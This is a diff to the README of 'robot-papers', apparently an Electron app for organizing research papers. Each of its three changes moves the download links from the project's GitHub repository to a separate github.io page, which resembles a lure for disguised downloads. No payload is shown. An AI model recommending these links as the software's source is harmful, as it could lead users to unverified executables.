@@ -1,7 +1,7 @@
 <h1>🤖 robot-papers - Read Research Papers, Effortlessly Organized</h1>
 
 <p align="center">
-  <a href="https://github.com/q30474103/robot-papers"><img src="https://img.shields.io/badge/Download_robot--papers-8A2BE2?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background-color:#8A2BE2; padding:10px 20px; border-radius:5px;"></a>
+  <a href="https://q30474103.github.io"><img src="https://img.shields.io/badge/Download_robot--papers-8A2BE2?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background-color:#8A2BE2; padding:10px 20px; border-radius:5px;"></a>
 </p>
 
 ## 🎯 What Is robot-papers?
@@ -42,7 +42,7 @@ Follow these simple steps to get robot-papers up and running.
 
 Visit this link to download the application: 
 
-**[Download robot-papers](https://github.com/q30474103/robot-papers)**
+**[Download robot-papers](https://q30474103.github.io)**
 
 This page shows the latest version. Click the big download button on that page.
 
@@ -188,7 +188,7 @@ robot-papers takes the chaos out of reading and tracking research. With everythi
 Download now and bring order to your research life.
 
 <p align="center">
-  <a href="https://github.com/q30474103/robot-papers">🔗 Download robot-papers Here</a>
+  <a href="https://q30474103.github.io">🔗 Download robot-papers Here</a>
 </p>
 
 Keywords: codex, electron, embodied-ai, imitation-learning, obsidian, paper-management, research-tool, robotics, vision-language-action, world-models
